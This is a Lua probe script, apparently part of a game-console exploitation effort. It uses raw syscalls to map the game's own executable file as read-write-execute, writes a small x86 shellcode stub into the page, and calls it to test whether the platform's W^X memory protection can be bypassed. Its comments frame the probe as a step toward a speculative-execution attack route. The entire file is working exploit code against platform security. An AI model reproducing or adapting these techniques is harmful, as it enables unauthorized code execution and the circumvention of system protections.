-- CRASH_CLASS: HIGH (deliberate: calls into a page we just wrote; a non-executable mapping kills the loader and the game may follow)
-- PROBE 1251b: force the exec call - the single experiment that decides the CPU route
--
-- Context: 1245a showed an anonymous mmap with prot=7 yields a page that cannot be
-- executed (fcall faults with CS=0x43, RIP=page, tf_err P=1/W=0).  The open question
-- is whether PROT_EXEC survives for a VNODE-backed mapping: anon and file mappings
-- go through different vm_object paths, and the W^X check may only cover OBJT_DEFAULT.
--
-- This probe is the direct test, no oracle in between:
--   open /app0/eboot.bin -> mmap(prot=7, MAP_PRIVATE) -> write "mov eax,0x1234; ret"
--   -> read it back -> native.fcall_with_rax(page, 0,0,0,0,0,0,0)
--
--   returned 0x1234  -> ring-3 code execution in a page we wrote.  The Spectre/CPU
--                       route in docs/SPECULATION_READ_14_10.md becomes runnable.
--   loader dies      -> PROT_EXEC is stripped for vnode mappings too; W^X is total
--                       and the CPU route is closed for good.
--
-- Run this LAST in a session.  Expect the game to die; the port will go away.

print("=== PROBE 1251b: FORCE EXEC CALL (deliberate) ===")
print("")

local function N(v)
  if type(v) == "table" and v.tonumber then return v:tonumber() end
  return tonumber(v) or 0
end
local function mk(n)
  local t = {}
  for k, v in pairs(syscall.pipe) do t[k] = v end
  t.syscall_no = n
  setmetatable(t, getmetatable(syscall.pipe))
  return t
end
local function hex(v) return string.format("0x%X", v) end

local sc5   = mk(5)
local sc189 = mk(189)
local sc477 = mk(477)
local sc74  = mk(74)

local ok, rv = pcall(function() return sc5("/app0/eboot.bin", 0, 0) end)
local fd = ok and N(rv) or -1
print(string.format("[1] open(/app0/eboot.bin) -> %d", fd))
if fd < 0 then
  print("    cannot continue without the file")
  print("=== DONE 1251b ===")
  return
end

local st = memory.alloc(0x100)
for i = 0, 0x3F do memory.write_dword(st + i * 4, 0) end
local ok2, rv2 = pcall(function() return sc189(fd, st) end)
local fsize = 0
if ok2 and N(rv2) == 0 then
  fsize = N(memory.read_dword(N(st) + 0x58)) + N(memory.read_dword(N(st) + 0x5C)) * 4294967296
end
print(string.format("[2] fstat -> rv=%s size=%s", tostring(rv2), hex(fsize)))

-- [3] the executable-looking mapping
local len = 0x4000
if fsize > 0 and fsize < len then len = fsize end
local ok3, rv3 = pcall(function() return sc477(uint64(0), uint64(len), uint64(7), uint64(2), uint64(fd), uint64(0)) end)
local target = (ok3 and N(rv3)) or -1
if target <= 0 or target > 0x7FFFFFFFFFFF then
  print(string.format("[3] mmap(prot=7, MAP_PRIVATE) FAILED rv=%s", tostring(rv3)))
  print("=== DONE 1251b ===")
  return
end
print(string.format("[3] mmap(len=%s, prot=7, MAP_PRIVATE) -> %s", hex(len), hex(target)))

-- [4] mov eax,0x1234 ; ret
local code = {0xB8, 0x34, 0x12, 0x00, 0x00, 0xC3}
for i = 1, 6 do memory.write_byte(target + i - 1, code[i]) end
local back = ""
for i = 0, 5 do back = back .. string.format("%02X ", N(memory.read_byte(target + i))) end
print(string.format("[4] wrote B8 34 12 00 00 C3, read back %s", back))

-- [5] mprotect(EXEC) as a separate data point; known to fail, cannot hurt
local ok5, rv5 = pcall(function() return sc74(uint64(target), uint64(len), uint64(7)) end)
print(string.format("[5] mprotect(RWX) -> rv=%s errno=%s", tostring(rv5), tostring(get_error_string())))

-- [6] the call
print(string.format("[6] fcall(%s) - if this page is not executable the loader dies here", hex(target)))
local ok6, v6 = pcall(function() return native.fcall_with_rax(target, 0, 0, 0, 0, 0, 0, 0) end)
if ok6 then
  local r = N(v6)
  print(string.format("    returned %s", hex(r)))
  if r == 0x1234 then
    print("    *** RING-3 CODE EXECUTION IN A PAGE WE WROTE - CONFIRMED ***")
  else
    print("    returned without 0x1234 - the call went somewhere else")
  end
else
  print("    fcall raised: " .. tostring(v6))
end

print("")
print("=== DONE 1251b ===")
